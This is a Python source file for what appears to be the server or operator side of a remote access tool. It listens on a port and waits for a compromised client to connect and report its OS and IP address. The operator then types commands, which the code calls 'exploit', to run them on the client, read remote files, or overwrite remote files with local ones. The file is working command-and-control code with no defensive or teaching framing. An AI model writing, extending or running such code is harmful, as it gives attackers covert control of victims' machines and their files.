import socket
import time


crash = None
connections = None
port = 55000

def main_screen():
    print('\n'*20)
    print('  __        __   _                          _ \n',
          ' \ \      / /__| | ___ ___  _ __ ___   ___| | \n',
          "  \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | \n",
          '   \ V  V /  __/ | (_| (_) | | | | | |  __/_| \n',
          '    \_/\_/ \___|_|\___\___/|_| |_| |_|\___(_) \n',
          '\n',)




class main():
    def __init__(self, HOST, PORT):
        self.HOST = HOST
        self.PORT = PORT
        while True:
            server = socket.socket()
            server.bind((self.HOST, self.PORT))
            print('[+] Server Started')
            print('[+] Listening For Client Connection ...')

            server.listen(1)
            client, client_addr = server.accept()

            os_name = client.recv(1024)
            target_ip = client.recv(1024)

            while True:
                try:
                    try:
                        client.settimeout(10.0)
                        client.send('Up'.encode('utf-8'))
                    except Exception as e:
                        print(e)
                        client.close()
                    client.settimeout(None)

                    exploit = input(f'{target_ip.decode()}@{os_name.decode()}~ ')
                    client.send(exploit.encode('utf-8'))

                    if exploit.startswith('read'):
                        # Receive the number of lines to read
                        lines = int(client.recv(1024).decode('utf-8', errors='replace'))

                        # Loop through each line based on the received number of lines
                        for _ in range(lines):
                            data = client.recv(131072).decode('utf-8', errors='replace')
                            print(f"{data}")
                            client.send(b'OK')  # Send acknowledgment after receiving each line

                        # Final acknowledgment after all lines are processed
                        client.recv(131072).decode('utf-8', errors='replace')
                        continue


                    elif exploit.startswith('edit'):

                        try:
                            local_f = input('Local_File >>> ')
                            remote_f = input('Remote_File >>> ')

                            client.send(remote_f.encode('utf-8'))

                            with open(local_f, 'r') as local_file:
                                lines = local_file.readlines()
                                client.send(str(len(lines)).encode('utf-8'))
                                # Send each line to the client

                                for line in lines:
                                    client.send(line.encode('utf-8'))
                                    ack = client.recv(1024)  # Wait for acknowledgment from the client

                                    if ack != b'OK':
                                        break


                        except Exception as e:
                            print(f'Edit error: {e}')

                        client.recv(131072).decode('utf-8', errors='replace')

                        continue

                    elif exploit.startswith('reconnect'):
                        print('[*] Reconnection')
                        break

                    elif exploit.startswith('exit'):
                        client.recv(131072).decode('utf-8', errors='replace')
                        client.close()
                        break


                    else:
                        length = client.recv(1024).decode('utf-8')
                        length = int(length)
                        received_data = b''

                        while len(received_data) < length:
                            chunk = client.recv(
                                min(131072, length - len(received_data)))

                            if not chunk:
                                break

                            received_data += chunk

                        try:
                            decoded_data = received_data.decode('utf-8', errors='replace')  # Decode if it's text
                            print(decoded_data)

                        except Exception as e:
                            print("Error decoding data:", e)



                except Exception:
                    print('In main class error')







if __name__ == "__main__":

    main_screen()

    option = input('| 1-Auto Port | <> | 2-Manual Port |\n>>> ')
    if option == '1':
        connections = input(' IP >>> ')
    elif option == '2':
        connections = input(' IP >>> ')
        while True:
            try:
                port = int(input(' PORT >>> '))
                break
            except Exception:
                print('Enter port in range 400-63000')
                continue

    try:
        while True:
            main(connections, port)
            print('Done')
    except Exception as err:
        crash = 200
        print(f'Crash report {crash} | {err}')


#crash reports codes
# 200 - run class error
#
#
